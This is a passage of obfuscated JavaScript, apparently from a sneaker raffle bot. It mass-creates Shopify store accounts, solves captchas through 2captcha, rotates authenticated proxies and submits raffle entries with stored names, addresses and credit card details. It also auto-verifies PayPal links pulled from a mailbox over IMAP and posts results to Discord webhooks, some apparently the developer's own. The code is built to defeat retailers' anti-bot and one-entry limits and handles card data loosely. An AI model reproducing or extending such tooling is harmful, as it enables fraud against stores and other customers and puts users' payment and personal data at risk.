            }), await _0x2580f9['goto'](_0x57d1b0), await _0xbec2fc(0xbb8), await _0x2580f9['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x27df86() + '\x20[' + _0x4696f9['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Filling\x20information'), await _0x2580f9['type']('#RegisterForm-FirstName', '' + bouncewear[_0x40451f]['FirstName']), await _0xbec2fc(0x226), await _0x2580f9['type']('#RegisterForm-LastName', '' + bouncewear[_0x40451f]['LastName']), await _0xbec2fc(0x226), await _0x2580f9['type']('#RegisterForm-email', '' + bouncewear[_0x40451f]['Email']), await _0xbec2fc(0x226), await _0x2580f9['type']('#RegisterForm-password', '' + bouncewear[_0x40451f]['Password']), await _0xbec2fc(0x226), await _0x2580f9['click']('#marketing'), console['log'](_0x27df86() + '\x20[' + _0x4696f9['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Submitting..'), await _0x2580f9['$eval']('#RegisterForm', _0x3db6d1 => _0x3db6d1['submit']()), await _0xbec2fc(0x1f40), console['log'](_0x27df86() + '\x20[' + _0x4696f9['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x2580f9['solveRecaptchas'](), await _0x2580f9['click']('.shopify-challenge__button.btn');
            async function _0x1caf83() {
                for (var _0x380dd7 = 0x0; _0x380dd7 < 0x4; _0x380dd7++) {
                    try {
                        console['log']('try'), await _0x2580f9['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x27df86() + '\x20[' + _0x4696f9['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20' + _0xe1d9e['red']('Catpcha\x20failed,\x20retrying..')), await _0x2580f9['solveRecaptchas'](), await _0x2580f9['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x1caf83(), console['log'](_0x27df86() + '\x20[' + _0x4696f9['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0xbec2fc(0x1f4);
            try {
                await _0x2580f9['waitForSelector']('.featured-title'), await _0xbec2fc(0x1f4), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x4696f9['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x40451f]['Email'] + '\x20Generated!')), _0x5b2323['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x40451f]['Email'] + ',' + bouncewear[_0x40451f]['Password']), console['log'](_0xe1d9e['yellow'](_0x27df86() + '\x20[' + _0x4696f9['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x40451f]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x20370c) {
                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x20370c));
            }
        } catch (_0x2c3349) {
            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20' + _0x2c3349));
        } finally {
            _0x3c121a && _0x3c121a['close'](), console['log']('Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
        }
    }
}
async function _0x1de564(_0x1df88a, _0x472d40, _0x240e0f) {
    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1c5a09['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xe87614 = 0x0; _0xe87614 < _0x472d40['length']; _0xe87614++) {
        _0x2167ba(_0x1df88a['name'] + '\x20Task\x20' + (_0xe87614 + 0x1) + '\x20/\x20' + _0x472d40['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21);
        var _0x24b281 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x50a8aa
                },
                {
                    'name': 'Product',
                    'value': '' + _0x472d40[_0xe87614]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x472d40[_0xe87614]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1c5a09['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x1c5a09['version']
                }
            ]
        }];
        const _0x5580a8 = { 'embeds': _0x24b281 };
        await _0x200aab(_0x472d40, _0xe87614);
        if (_0x472d40[_0xe87614]['Email'] == '' || _0x472d40[_0xe87614]['Password'] == '' || _0x472d40[_0xe87614]['FirstName'] == '' || _0x472d40[_0xe87614]['LastName'] == '') {
            console['log'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x472d40[_0xe87614]['Password'] == '' || _0x472d40[_0xe87614]['Password'] == undefined) && (_0x472d40[_0xe87614]['Password'] = 'ErehsaWonRaj1!');
        if (_0x1c5a09['useRandomProxy'] = ![])
            var _0x48e10a = _0x240e0f[_0xe87614]['split'](':');
        else
            var _0x465591 = Math['round'](Math['random']() * (_0x240e0f['length'] - 0x1)), _0x48e10a = _0x240e0f[_0x465591]['split'](':');
        const _0x434248 = await _0x59f17d['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x48e10a[0x0] + ':' + _0x48e10a[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x49a06e = await _0x434248['newPage']();
            await _0x49a06e['authenticate']({
                'username': '' + _0x48e10a[0x2],
                'password': '' + _0x48e10a[0x3]
            }), console['log'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x49a06e['setRequestInterception'](!![]), _0x49a06e['on']('request', _0x229626 => {
                _0x229626['resourceType']() === 'image' || _0x229626['resourceType']() === 'font' || _0x229626['resourceType']() === 'media' ? _0x229626['abort']() : _0x229626['continue']();
            }), await _0x49a06e['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x49a06e['goto']('' + _0x472d40[_0xe87614]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x49a06e['waitForSelector']('#btnPdpAtb'), console['log'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x472d40[_0xe87614]['Size']);
            const _0x271626 = await _0x49a06e['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x9d0f2e => {
                return _0x9d0f2e['map'](_0x17d96b => _0x17d96b['innerText']);
            }), _0x54dcbe = await _0x49a06e['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x44d3b3 = ![];
            if (_0x472d40[_0xe87614]['Size'] == 'RANDOM') {
                var _0x39a677 = Math['round'](Math['random']() * (_0x54dcbe['length'] - 0x1));
                await _0x54dcbe[_0x39a677]['click']();
            } else
                for (var _0x29e10d = 0x0; _0x29e10d < _0x271626['length']; _0x29e10d++) {
                    if (_0x271626[_0x29e10d] != _0x472d40[_0xe87614]['Size'])
                        continue;
                    try {
                        await _0x54dcbe[_0x29e10d]['click']();
                    } catch {
                        console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x44d3b3 = !![];
                    }
                }
            if (_0x44d3b3)
                continue;
            await _0xbec2fc(0x578), await _0x49a06e['click']('#btnPdpAtb'), await _0x49a06e['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0xbec2fc(0x3e8), console['log'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x49a06e['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x49a06e['waitForSelector']('#email'), await _0x49a06e['type']('#email', _0x472d40[_0xe87614]['Email']), await _0xbec2fc(0x226), await _0x49a06e['click']('#guest-submit'), await _0xbec2fc(0x1b58), console['log'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x49a06e['waitForSelector']('#firstname'), await _0x49a06e['type']('#firstname', _0x472d40[_0xe87614]['FirstName'], 0x1f4), await _0xbec2fc(0x190), await _0x49a06e['waitForSelector']('#surname'), await _0x49a06e['type']('#surname', _0x472d40[_0xe87614]['LastName'], 0x1f4), await _0xbec2fc(0x190), await _0x49a06e['waitForSelector']('#mobile'), await _0x49a06e['type']('#mobile', _0x472d40[_0xe87614]['Phone'], 0x1f4), await _0xbec2fc(0x190), await _0x49a06e['click']('#enterManualDiv'), await _0xbec2fc(0x5dc), await _0x49a06e['waitForSelector']('#address1'), await _0x49a06e['type']('#address1', _0x472d40[_0xe87614]['Address1'] + '\x20' + _0x472d40[_0xe87614]['HouseNumber'], 0x226), await _0xbec2fc(0x384), await _0x49a06e['waitForSelector']('#address2'), await _0x49a06e['type']('#address2', '' + _0x472d40[_0xe87614]['Address2'], 0x226), await _0xbec2fc(0x320);
            const _0x166623 = await _0x49a06e['$$eval']('#countryselect_view3\x20>\x20option', _0x1a380f => {
                return _0x1a380f['map'](_0xfcf7de => _0xfcf7de['value']);
            });
            var _0x16a997;
            for (var _0x176a1b = 0x0; _0x176a1b < _0x166623['length']; _0x176a1b++) {
                if (_0x166623[_0x176a1b]['startsWith']('' + _0x472d40[_0xe87614]['Country'])) {
                    _0x16a997 = _0x166623[_0x176a1b];
                    break;
                }
                continue;
            }
            await _0x49a06e['select']('#countryselect_view3', '' + _0x16a997), await _0x49a06e['waitForSelector']('#address4'), await _0x49a06e['type']('#address4', '' + _0x472d40[_0xe87614]['City'], 0x1f4), await _0xbec2fc(0x384), await _0x49a06e['waitForSelector']('#postcode'), await _0x49a06e['type']('#postcode', '' + _0x472d40[_0xe87614]['Zip'], 0x1f4), await _0xbec2fc(0x4b0);
            const _0x7e32c6 = await _0x49a06e['url']();
            console['log'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x53f38b = _0x7e32c6['split']('?')[0x1], _0x428606 = await _0x49a06e['$']('#co_address_submit');
            await _0x428606['evaluate'](_0x548409 => _0x548409['click']()), await _0xbec2fc(0x1388), await _0x49a06e['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x53f38b), console['log'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x49a06e['waitForSelector']('#paymentbuttons'), await _0xbec2fc(0x1388), await _0x49a06e['click']('#paymentbuttons\x20>\x20div'), await _0xbec2fc(0x1c2), await _0x49a06e['waitForSelector']('#card-number'), await _0x49a06e['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x3df67d = await _0x49a06e['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x4ff1af = await _0x3df67d['contentFrame']();
            await _0x4ff1af['waitForSelector']('.InputContainer'), await _0x4ff1af['click']('.InputContainer\x20>\x20input'), await _0xbec2fc(0x578), await _0x49a06e['type']('#card-number', '' + _0x472d40[_0xe87614]['CreditNumber']), await _0xbec2fc(0xfa), await _0x49a06e['type']('#card-expiry', '' + _0x472d40[_0xe87614]['ExpiryDate']), await _0xbec2fc(0xfa), await _0x49a06e['type']('#card-cvc', '' + _0x472d40[_0xe87614]['CVV']), await _0xbec2fc(0x7d0), await _0x49a06e['click']('#card-button'), console['log'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x49a06e['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x4f1a4a(_0x5df164, _0x5580a8);
            } catch {
                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x203DS\x20Failed')), _0x24b281[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x24b281[0x0]['description'] = '3DS\x20Failed', await _0x4f1a4a(_0x166efb, _0x5580a8);
            }
        } catch (_0x18b31c) {
            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x1df88a['name'] + ']\x20Task\x20' + (_0xe87614 + 0x1) + '\x20:\x20' + _0x18b31c)), _0x24b281[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x24b281[0x0]['description'] = '' + _0x18b31c, await _0x4f1a4a(_0x166efb, _0x5580a8);
        } finally {
            _0x434248 && _0x434248['close']();
            if (_0xe87614 + 0x1 == _0x472d40['length']) {
                console['log'](_0xe1d9e['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0xbec2fc(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x1c5a09['AfewDelay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['AfewDelay']);
        }
    }
}
async function _0x55d846(_0x22ae92, _0x176f1d, _0x36bf27, _0x4cbc41, _0x4fd73d) {
    var _0xb49fc3, _0x391336 = {}, _0x3dd36e = [], _0x4830ab = {}, _0x2a19c1 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x4cbc41 && (_0x4cbc41 = {});
    if (_0x176f1d != 'ver') {
        _0x2167ba(_0x36bf27['name'] + '\x20Task\x20' + (_0x22ae92 + 0x1) + '\x20/\x20' + _0x4cbc41['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0x4cbc41, _0x22ae92), _0x3dd36e = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x50a8aa
                },
                {
                    'name': 'Size',
                    'value': '' + _0x4cbc41[_0x22ae92]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1c5a09['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x18cd5d
                }
            ]
        }], _0x4830ab = { 'embeds': _0x3dd36e }, _0x391336 = _0x36bf27['data'];
        _0x176f1d == 'exp' ? _0x391336['data']['attributes']['email'] = '' + _0x4cbc41[_0x22ae92]['FirstName'] + _0x4cbc41[_0x22ae92]['LastName'] + _0x1c5a09['catchall'] : _0x391336['data']['attributes']['email'] = '' + _0x4cbc41[_0x22ae92]['Email'];
        if (_0x4cbc41[_0x22ae92]['Size'] == 'RANDOM') {
        }
        _0x391336['data']['attributes']['properties']['$first_name'] = '' + _0x4cbc41[_0x22ae92]['FirstName'], _0x391336['data']['attributes']['properties']['$last_name'] = '' + _0x4cbc41[_0x22ae92]['LastName'], _0x391336['data']['attributes']['properties']['$address1'] = _0x4cbc41[_0x22ae92]['Address1'] + '\x20' + _0x4cbc41[_0x22ae92]['Address2'] + '\x20' + _0x4cbc41[_0x22ae92]['HouseNumber'], _0x391336['data']['attributes']['properties']['$zip'] = '' + _0x4cbc41[_0x22ae92]['Zip'], _0x391336['data']['attributes']['properties']['$city'] = '' + _0x4cbc41[_0x22ae92]['City'], _0x391336['data']['attributes']['properties']['$country'] = '' + _0x4cbc41[_0x22ae92]['Country'], _0x391336['data']['attributes']['properties']['Size'] = '' + _0x4cbc41[_0x22ae92]['Size'], _0x391336['data']['attributes']['properties']['$phone_number'] = '' + _0x4cbc41[_0x22ae92]['Phone'], _0x391336['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4cbc41[_0x22ae92]['Follower'];
    }
    if (_0x1c5a09['useRandomProxy'] = ![])
        var _0x4acf9f = _0x4fd73d[_0x22ae92]['split'](':');
    else
        var _0x244660 = Math['round'](Math['random']() * (_0x4fd73d['length'] - 0x1)), _0x4acf9f = _0x4fd73d[_0x244660]['split'](':');
    var _0x3812cd = {
        'jar': _0x1da69d,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x36bf27['url'],
        'headers': _0x36bf27['headers'],
        'body': JSON['stringify'](_0x391336),
        'proxy': 'http://' + _0x4acf9f[0x2] + ':' + _0x4acf9f[0x3] + '@' + _0x4acf9f[0x0] + ':' + _0x4acf9f[0x1]
    };
    return _0x176f1d != 'ver' && (_0x3812cd['url'] = _0x36bf27['url'], _0x3812cd['headers'] = _0x36bf27['headers']), _0x176f1d == 'ver' && (_0x3812cd['method'] = 'GET'), new Promise(function (_0xfadff7, _0x48ef90) {
        callback = async (_0x56d8ec, _0x5344fc, _0x36f137) => {
            if (!_0x56d8ec && _0x5344fc['statusCode'] == 0xca || !_0x56d8ec && _0x5344fc['statusCode'] == 0xc8) {
                if (_0x176f1d != 'ver') {
                    var _0x351809 = await _0x597409(_0x4cbc41[_0x22ae92], _0x36bf27, 'dev', ![]), _0x3cb7d8 = await _0x597409(_0x4cbc41[_0x22ae92], _0x36bf27, 'pub', ![]);
                    const _0x496be8 = {
                        'succesDEVMSG': { 'embeds': [_0x351809] },
                        'succesPUBMSG': { 'embeds': [_0x3cb7d8] }
                    };
                    if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                        try {
                            await _0x4f1a4a(_0x1c5a09['webhook'], _0x496be8['succesDEVMSG']);
                        } catch {
                        }
                    await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x496be8['succesDEVMSG']), await _0xbec2fc(0xc8);
                    try {
                        await _0x4f1a4a(_0x53e58f, _0x496be8['succesPUBMSG']);
                    } catch {
                    }
                    _0x498d8e(_0x4cbc41[_0x22ae92], _0x36bf27);
                }
                _0xfadff7(console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x36bf27['name'] + ']\x20Task\x20' + (_0x22ae92 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x176f1d != 'ver') {
                    var _0x3351f3 = '' + _0x56d8ec, _0x32043c = await _0x597409(_0x4cbc41[_0x22ae92], _0x36bf27, 'dev', !![], _0x3351f3), _0x771d1c = {};
                    _0x771d1c['errorDEV'] = { 'embeds': [_0x32043c] }, _0x176a1f(_0x4cbc41[_0x22ae92], _0x36bf27), _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x771d1c['errorDEV']), await _0x4f1a4a(_0x166efb, _0x771d1c['errorDEV']);
                }
                _0x48ef90(console['log'](_0x27df86() + '\x20[' + _0x36bf27['name'] + ']\x20Task\x20' + (_0x22ae92 + 0x1) + ':\x20' + _0x56d8ec));
            }
        };
        try {
            _0x176f1d != 'ver' && console['log'](_0x27df86() + '\x20[' + _0x36bf27['name'] + ']\x20Task\x20' + (_0x22ae92 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x391336['data']['attributes']['email']), _0x4cfc83(_0x3812cd, callback);
        } catch (_0x31e89d) {
            console['log'](_0x27df86() + '\x20Task\x20' + (_0x22ae92 + 0x1) + ':\x20' + _0x31e89d);
        }
    });
}
;
async function _0xa38ef8(_0x1d66aa, _0x2ee5d8, _0x2c3070) {
    var _0x1d66aa = [];
    async function _0x48076b() {
        var _0x5041e8 = new _0x1c5c24({
            'user': _0x1c5a09['masterMail'],
            'password': _0x1c5a09['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x2d66a6(_0x2c530d) {
            _0x5041e8['openBox']('INBOX', ![], _0x2c530d);
        }
        _0x5041e8['once']('ready', function () {
            _0x2d66a6(function (_0x3533e1, _0x109c64) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x3533e1)
                    throw _0x3533e1;
                _0x5041e8['seq']['search'](['UNSEEN'], function (_0xc4b42b, _0x385492) {
                    if (!_0x385492 || !_0x385492['length'])
                        console['log'](_0x27df86() + '\x20[' + _0x2ee5d8['name'] + ']\x20No\x20mails\x20found'), _0x5041e8['end']();
                    else {
                        var _0x8e1c05 = _0x5041e8['seq']['fetch'](_0x385492, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x8e1c05['on']('message', function (_0x50e140, _0xa470e5) {
                            var _0x24c1c2 = '(#' + _0xa470e5 + ')\x20';
                            _0x50e140['on']('body', function (_0x44ed8a, _0x5d4e8b) {
                                _0x39d64d(_0x44ed8a, (_0x89d981, _0x15bcbc) => {
                                    if (_0x15bcbc['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x15bcbc['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x15bcbc['text']['split']('[')[0x2];
                                        var _0x3db905 = mes['split'](']')[0x0];
                                        _0x1d66aa['push'](_0x3db905);
                                    }
                                });
                            }), _0x50e140['once']('end', function () {
                            });
                        }), _0x8e1c05['once']('error', function (_0x37c11c) {
                            console['log']('Fetch\x20error:\x20' + _0x37c11c);
                        }), _0x8e1c05['once']('end', function () {
                            _0x5041e8['end']();
                        });
                    }
                });
            });
        }), _0x5041e8['once']('error', function (_0x4811e0) {
            console['log'](_0xe1d9e['red'](_0x4811e0['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x5041e8['once']('end', async function () {
        }), _0x5041e8['connect']();
    }
    try {
        _0x48076b(), await _0xbec2fc(0xfa0), console['log']('Found\x20' + _0x1d66aa['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
    }
    var _0x1785e0;
    _0x2167ba('' + _0x2ee5d8);
    var _0x518940 = _0x2c3070[0x0]['split'](':');
    const _0x169941 = await _0x59f17d['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x518940[0x0] + ':' + _0x518940[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x27df86() + '\x20[' + _0x2ee5d8 + ']\x20Getting\x20Session');
        const _0xe8fcf5 = await _0x169941['newPage']();
        await _0xe8fcf5['authenticate']({
            'username': '' + _0x518940[0x2],
            'password': '' + _0x518940[0x3]
        }), await _0xe8fcf5['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0xe8fcf5, await _0xe8fcf5['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x27df86() + '\x20[' + _0x2ee5d8 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0xe8fcf5['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x27df86() + '\x20[' + _0x2ee5d8 + ']\x20Successfully\x20logged\x20in'), await _0xbec2fc(0x2710);
        } catch (_0x2ee1cd) {
            throw new Error('Login\x20session\x20expired\x20' + _0x2ee1cd);
        }
        for (var _0x383ff7 = 0x0; _0x383ff7 < _0x1d66aa['length']; _0x383ff7++) {
            console['log'](_0x27df86() + '\x20[' + _0x2ee5d8 + ']\x20Task\x20' + (_0x383ff7 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x2167ba(_0x2ee5d8 + '\x20Task\x20' + (_0x383ff7 + 0x1) + '\x20/\x20' + _0x1d66aa['length']);
            const _0x5a5f57 = await _0x169941['newPage']();
            await _0x5a5f57['goto']('' + _0x1d66aa[_0x383ff7], { 'waitUntil': 'networkidle2' }), await _0xbec2fc(0xbb8);
            try {
                const _0x23e9c8 = await _0x5a5f57['$']('#challenge-heading');
                _0x23e9c8 && (console['log'](_0x27df86() + '\x20[' + _0x2ee5d8 + ']\x20Task\x20' + (_0x383ff7 + 0x1) + '\x20:\x20' + _0xe1d9e['yellow']('2FA\x20Required')), await _0x5a5f57['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0xbec2fc(0x61a8), await _0x5a5f57['waitForSelector']('#payment-submit-btn'), await _0x5a5f57['$eval']('#payment-submit-btn', _0x2337e2 => _0x2337e2['click']()), await _0x5a5f57['click']('#payment-submit-btn');
                try {
                    await _0x5a5f57['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0xbec2fc(0x5dc), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x2ee5d8 + ']\x20Task\x20' + (_0x383ff7 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x418598) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x418598['message']);
                } finally {
                    await _0x5a5f57['close'](), await _0xbec2fc(0x4650);
                }
            } catch (_0x30d08c) {
                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2ee5d8 + ']\x20Task\x20' + (_0x383ff7 + 0x1) + '\x20:\x20' + _0x30d08c));
            }
        }
    } catch (_0x5a048b) {
        console['log'](_0xe1d9e['red']('' + _0x5a048b));
    } finally {
        await _0x169941['close']();
    }
}
const _0x11a818 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x1b0331, _0x4d2101, _0x571b30) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4b411a = 0x0; _0x4b411a < _0x4d2101['length']; _0x4b411a++) {
                        if (_0x2c620d != 'yes')
                            var _0x2c620d = '', _0x1e78c8 = 0x0;
                        var _0x310106;
                        await _0x200aab(_0x4d2101, _0x4b411a), _0x2167ba(_0x1b0331['name'] + '\x20Task\x20' + (_0x4b411a + 0x1) + '\x20/\x20' + _0x4d2101['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21);
                        var _0x24fdd7 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x3ca9ce = Math['round'](Math['random']() * (_0x24fdd7['length'] - 0x1));
                        _0x4d2101[_0x4b411a]['Size'] == 'RANDOM' && (_0x4d2101[_0x4b411a]['Size'] = _0x24fdd7[_0x3ca9ce]);
                        var _0x23aaab = Math['round'](Math['random']() * (_0x571b30['length'] - 0x1)), _0x4f431b = _0x571b30[_0x23aaab]['split'](':'), _0x30d5cb;
                        try {
                            _0x30d5cb = await _0x59f17d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f431b[0x0] + ':' + _0x4f431b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x30d5cb = await _0x59f17d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f431b[0x0] + ':' + _0x4f431b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Task\x20' + (_0x4b411a + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x14b788 = await _0x30d5cb['newPage']();
                            await _0x14b788['authenticate']({
                                'username': '' + _0x4f431b[0x2],
                                'password': '' + _0x4f431b[0x3]
                            }), await _0x14b788['setRequestInterception'](!![]), _0x14b788['on']('request', _0x278c93 => {
                                _0x278c93['resourceType']() === 'image' || _0x278c93['resourceType']() === 'font' || _0x278c93['resourceType']() === 'media' ? _0x278c93['abort']() : _0x278c93['continue']();
                            }), await _0x14b788['goto'](_0x4d2101[_0x4b411a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Task\x20' + (_0x4b411a + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x14b788['waitForSelector']('#accept-all-gdpr'), await _0x14b788['click']('#accept-all-gdpr'), await _0x14b788['waitForSelector']('#raffles-product'), await _0xbec2fc(0x3e8), await _0x14b788['$eval']('#raffles-product', _0x3c9c07 => _0x3c9c07['click']()), await _0xbec2fc(0x1388), await _0x14b788['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x23ba19 = await _0x14b788['$']('.fancybox-inner\x20>\x20iframe'), _0x30b552 = await _0x23ba19['contentFrame']();
